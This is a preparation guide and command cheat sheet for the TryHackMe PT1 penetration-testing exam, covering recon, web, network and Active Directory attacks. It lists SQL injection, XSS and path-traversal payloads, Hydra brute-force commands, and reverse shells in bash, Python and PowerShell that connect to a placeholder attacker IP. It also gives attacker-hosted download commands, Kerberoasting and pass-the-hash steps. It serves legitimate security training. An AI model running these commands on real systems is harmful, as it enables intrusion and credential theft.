# TryHackMe PT1 Exam Preparation Guide

Based on the exam structure and reviews from recent test-takers, here's a comprehensive breakdown of what you'll need.

## Exam Overview

The PT1 is a 48-hour practical exam covering three domains:

| Domain                   | Weight | Focus                                                  |
| ------------------------ | ------ | ------------------------------------------------------ |
| Web Application Security | ~40%   | OWASP Top 10, manual testing                           |
| Network Security         | ~36%   | Linux/Windows enumeration and privilege escalation     |
| Active Directory         | ~24%   | Domain enumeration, Kerberos attacks, lateral movement |

**Key insight from reviews:** The web application section is reportedly the most challenging and heavily weighted—allocate significant time there. [systemweakness.com](https://systemweakness.com/full-guide-to-help-you-pass-your-tryhackme-pt1-exam-3cf1f1fcb30b) [mresecurity.com](https://mresecurity.com/blog/try-hack-me-pt-1-certification-review-entry-level-penetration-testing-exam)

## Reconnaissance & Enumeration

### DNS and Subdomain Discovery

```bash
# DNS enumeration
dig axfr @<nameserver> <domain>
nslookup -type=any <domain>
host -l <domain> <nameserver>
# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://FUZZ.<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Port Scanning

```bash
# Initial fast scan
nmap -sC -sV -oN initial.txt <target>
# Full port scan
nmap -p- -sV -oN allports.txt <target>
# UDP scan (common ports)
nmap -sU --top-ports 20 <target>
# Aggressive scan with scripts
nmap -A -T4 -p <ports> <target>
```

### Service Enumeration

```bash
# SMB
smbclient -L //<target> -N
enum4linux -a <target>
crackmapexec smb <target> --shares
smbmap -H <target>
# SNMP
snmpwalk -v2c -c public <target>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
# LDAP
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

## Web Application Testing

### Directory and Content Discovery

```bash
# Directory brute-forcing
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# Virtual host discovery
ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <filter-size>
```

### SQL Injection

```bash
# SQLMap basics
sqlmap -u "http://<target>/page?id=1" --dbs
sqlmap -u "http://<target>/page?id=1" -D <database> --tables
sqlmap -u "http://<target>/page?id=1" -D <database> -T <table> --dump
# POST request
sqlmap -u "http://<target>/login" --data="user=admin&pass=test" --dbs
# With cookies/authentication
sqlmap -u "http://<target>/page?id=1" --cookie="session=abc123" --dbs
```

**Manual testing payloads:**

```
' OR 1=1--
' UNION SELECT null,null,null--
' AND 1=2 UNION SELECT username,password FROM users--
```

### XSS Testing

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
"><script>alert(document.cookie)</script>
```

### IDOR Testing

- Increment/decrement numeric IDs in URLs and API calls
- Check for UUID predictability
- Test horizontal privilege escalation (access other users' data)
- Test vertical privilege escalation (access admin functions)

### File Inclusion/Path Traversal

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/var/www/html/../../../etc/passwd
```

### Burp Suite Essentials

- **Proxy:** Intercept and modify requests
- **Repeater:** Manually manipulate and resend requests
- **Intruder:** Automate parameter fuzzing
- **Decoder:** Encode/decode payloads

## Network Penetration Testing

### Password Attacks

```bash
# Hydra
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -L users.txt -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
# CrackMapExec
crackmapexec smb <target> -u users.txt -p passwords.txt
crackmapexec winrm <target> -u <user> -p <password>
```

### Exploitation

```bash
# Searchsploit
searchsploit <service> <version>
searchsploit -m <exploit-id>
# Metasploit basics
msfconsole
search <vulnerability>
use <module>
set RHOSTS <target>
set LHOST <your-ip>
exploit
```

### Reverse Shells

```bash
# Netcat listener
nc -lvnp <port>
rlwrap nc -lvnp <port>  # For better shell interaction
# Common reverse shells
bash -i >& /dev/tcp/<your-ip>/<port> 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your-ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### File Transfers

```bash
# Python HTTP server
python3 -m http.server 80
# Download on target (Linux)
wget http://<your-ip>/file
curl http://<your-ip>/file -o file
# Download on target (Windows)
certutil -urlcache -f http://<your-ip>/file file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<your-ip>/file','C:\temp\file.exe')"
iwr -uri http://<your-ip>/file -outfile file.exe
```

## Privilege Escalation

### Linux

```bash
# Quick enumeration
id
sudo -l
cat /etc/crontab
find / -perm -4000 2>/dev/null  # SUID binaries
find / -writable -type f 2>/dev/null
cat /etc/passwd
ls -la /home
# Automated tools
./linpeas.sh
./linux-smart-enumeration.sh
```

**Check GTFOBins for exploiting SUID binaries and sudo permissions.**

### Windows

```powershell
# Quick enumeration
whoami /all
net user
net localgroup administrators
systeminfo
cmdkey /list  # Saved credentials
# Automated tools
.\winPEAS.exe
.\PowerUp.ps1
Invoke-AllChecks
```

## Active Directory

### Domain Enumeration

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Find-LocalAdminAccess
# BloodHound collection
.\SharpHound.exe -c All
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

```bash
# From Linux
bloodhound-python -u <user> -p <password> -d <domain> -dc <dc-ip> -c All
```

### Kerberos Attacks

```bash
# AS-REP Roasting (no pre-auth required)
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip>
# Kerberoasting
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request
# Crack the hashes
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt  # AS-REP
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt    # Kerberoast
```

### Lateral Movement

```bash
# Pass-the-Hash
crackmapexec smb <target> -u <user> -H <ntlm-hash>
psexec.py <domain>/<user>@<target> -hashes :<ntlm-hash>
evil-winrm -i <target> -u <user> -H <ntlm-hash>
# Pass-the-Ticket
export KRB5CCNAME=<ticket.ccache>
psexec.py <domain>/<user>@<target> -k -no-pass
# Remote execution with credentials
psexec.py <domain>/<user>:<password>@<target>
wmiexec.py <domain>/<user>:<password>@<target>
evil-winrm -i <target> -u <user> -p <password>
```

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w '<password>' -b "DC=domain,DC=com" "(objectClass=user)"
```

## Essential Tool List

|Category|Tools|
|---|---|
|Scanning|Nmap, Rustscan|
|Web Testing|Burp Suite, Gobuster, Feroxbuster, ffuf, SQLMap, Nikto|
|Password Attacks|Hydra, CrackMapExec, Hashcat, John|
|AD/Windows|BloodHound, Impacket suite, Evil-WinRM, PowerView, Mimikatz|
|Shells & Post-Ex|Netcat, rlwrap, linPEAS, winPEAS|
|Exploitation|Metasploit, Searchsploit|

## Time Management Tips

Based on feedback from those who've taken the exam:

1. **Don't underestimate the web section**—it's harder than expected and worth the most points. [el-gastra.tech](https://el-gastra.tech/posts/pt1-review/)
2. **Take breaks**—48 hours is long; fatigue leads to missed findings.
3. **Document as you go**—you need to write a report; take screenshots and notes throughout.
4. **If you're stuck, move on**—you can return to any section at any time.
5. **Prepare your toolkit beforehand**—have scripts, wordlists, and cheatsheets ready.

## Recommended Preparation

TryHackMe suggests completing these paths before attempting the exam:

- Jr Penetration Tester
- Web Fundamentals
- Active Directory Basics

Practice rooms that simulate the exam environment will be particularly valuable. Make notes as you go through training content—you'll want quick references during the exam. [help.tryhackme.com](https://help.tryhackme.com/en/articles/11172303-pt1-training-content)